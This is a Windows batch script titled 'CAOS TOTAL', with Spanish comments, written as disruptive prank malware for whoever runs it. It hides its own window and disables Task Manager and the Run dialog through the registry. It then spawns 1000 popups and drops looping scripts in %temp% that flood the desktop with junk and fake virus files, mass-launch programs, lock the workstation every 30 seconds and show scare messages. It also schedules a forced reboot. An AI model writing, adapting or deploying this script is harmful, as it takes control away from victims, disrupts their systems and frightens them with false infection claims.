@echo off
color 0c
title CAOS TOTAL
mode con: cols=80 lines=25

:: Ocultar ventana principal
if "%1" == "h" goto begin
mshta vbscript:createobject("wscript.shell").run("%~nx0 h",0)(window.close)
exit

:begin
:: Deshabilitar protecciones
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul 2>&1

:: 1. Abrir 1000 ventanas emergentes
for /l %%x in (1, 1, 1000) do (
    start "" msg * "¡SISTEMA COMPROMETIDO! Este virus ha tomado control total de tu PC!"
    if %%x equ 500 start "" msg * "¡YA NO HAY VUELTA ATRÁS!"
    if %%x equ 900 start "" msg * "¡PREPARATE PARA EL REINICIO INMINENTE!"
)

:: 2. Efectos visuales extremos
echo @echo off > "%temp%\visual.bat"
echo :visual >> "%temp%\visual.bat"
echo rundll32.exe user32.dll,UpdatePerUserSystemParameters >> "%temp%\visual.bat"
echo for /l %%i in (1,1,50) do ( >> "%temp%\visual.bat"
echo     set /a color=%%random %% 16 >> "%temp%\visual.bat"
echo     color %%color%% >> "%temp%\visual.bat"
echo ) >> "%temp%\visual.bat"
echo timeout /t 1 /nobreak ^> nul >> "%temp%\visual.bat"
echo goto visual >> "%temp%\visual.bat"
start /min "" "%temp%\visual.bat"

:: 3. Cambiar fondo de pantalla cada segundo
echo @echo off > "%temp%\fondo.bat"
echo :fondo >> "%temp%\fondo.bat"
echo set /a num=^!random! %% 10 + 1 >> "%temp%\fondo.bat"
echo reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Windows\Web\Wallpaper\Windows\img!num!.jpg" /f >> "%temp%\fondo.bat"
echo reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 10 /f >> "%temp%\fondo.bat"
echo rundll32.exe user32.dll,UpdatePerUserSystemParameters >> "%temp%\fondo.bat"
echo timeout /t 1 /nobreak ^> nul >> "%temp%\fondo.bat"
echo goto fondo >> "%temp%\fondo.bat"
start /min "" "%temp%\fondo.bat"

:: 4. Inundar escritorio con archivos
echo @echo off > "%temp%\inundar.bat"
echo :inundar >> "%temp%\inundar.bat"
echo set /a num=^!random! %% 100 + 1 >> "%temp%\inundar.bat"
echo echo "ARCHIVO BASURA NUMERO !num!" ^> "%USERPROFILE%\Desktop\BASURA!num!.txt" >> "%temp%\inundar.bat"
echo echo "¡TU PC ESTA INFECTADO!" ^> "%USERPROFILE%\Desktop\ADVERTENCIA!num!.txt" >> "%temp%\inundar.bat"
echo echo @echo off ^> "%USERPROFILE%\Desktop\virus!num!.bat" >> "%temp%\inundar.bat"
echo echo start "" msg * "¡SISTEMA COMPROMETIDO!" ^>^> "%USERPROFILE%\Desktop\virus!num!.bat" >> "%temp%\inundar.bat"
echo timeout /t 1 /nobreak ^> nul >> "%temp%\inundar.bat"
echo goto inundar >> "%temp%\inundar.bat"
start /min "" "%temp%\inundar.bat"

:: 5. Abrir aplicaciones masivamente
echo @echo off > "%temp%\apps.bat"
echo :apps >> "%temp%\apps.bat"
echo for /l %%i in (1,1,10) do ( >> "%temp%\apps.bat"
echo     start chrome.exe >> "%temp%\apps.bat"
echo     start notepad.exe >> "%temp%\apps.bat"
echo     start explorer.exe >> "%temp%\apps.bat"
echo     start cmd.exe >> "%temp%\apps.bat"
echo     start mspaint.exe >> "%temp%\apps.bat"
echo     start calc.exe >> "%temp%\apps.bat"
echo     start wordpad.exe >> "%temp%\apps.bat"
echo     start control.exe >> "%temp%\apps.bat"
echo     start taskmgr.exe >> "%temp%\apps.bat"
echo ) >> "%temp%\apps.bat"
echo timeout /t 2 /nobreak ^> nul >> "%temp%\apps.bat"
echo goto apps >> "%temp%\apps.bat"
start /min "" "%temp%\apps.bat"

:: 6. Reiniciar PC en 3 minutos con mensaje persistente
shutdown /r /t 180 /c "¡SISTEMA COMPROMETIDO! Tu PC se reiniciará en 3 minutos. ¡No hay escapatoria!"

:: 7. Advertencias infinitas más agresivas
echo @echo off > "%temp%\advertencias.bat"
echo :advertencia >> "%temp%\advertencias.bat"
echo msg * "¡ADVERTENCIA CRÍTICA! Tu sistema está en peligro inminente." >> "%temp%\advertencias.bat"
echo msg * "¡MALWARE DETECTADO! Todos tus archivos están siendo comprometidos." >> "%temp%\advertencias.bat"
echo msg * "¡FALLO DEL SISTEMA! Windows dejará de funcionar pronto." >> "%temp%\advertencias.bat"
echo timeout /t 3 /nobreak ^> nul >> "%temp%\advertencias.bat"
echo goto advertencia >> "%temp%\advertencias.bat"
start /min "" "%temp%\advertencias.bat"

:: 8. Efectos de sonido
echo @echo off > "%temp%\sonido.bat"
echo :sonido >> "%temp%\sonido.bat"
echo for /l %%i in (1,1,10) do ( >> "%temp%\sonido.bat"
echo     echo ^g >> "%temp%\sonido.bat"
echo ) >> "%temp%\sonido.bat"
echo timeout /t 5 /nobreak ^> nul >> "%temp%\sonido.bat"
echo goto sonido >> "%temp%\sonido.bat"
start /min "" "%temp%\sonido.bat"

:: 9. Bloquear ratón y teclado periódicamente
echo @echo off > "%temp%\bloqueo.bat"
echo :bloqueo >> "%temp%\bloqueo.bat"
echo rundll32.exe user32.dll,LockWorkStation >> "%temp%\bloqueo.bat"
echo timeout /t 30 /nobreak ^> nul >> "%temp%\bloqueo.bat"
echo goto bloqueo >> "%temp%\bloqueo.bat"
start /min "" "%temp%\bloqueo.bat"

:: 10. Modificar registro para más caos
reg add "HKCU\Control Panel\Colors" /v Background /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /d 2 /f

:: Mensaje inicial
echo ¡EL CAOS TOTAL HA COMENZADO!
echo ¡SISTEMA COMPROMETIDO!
echo ¡PREPARATE PARA EL REINICIO INMINENTE!
timeout /t 5 /nobreak > nul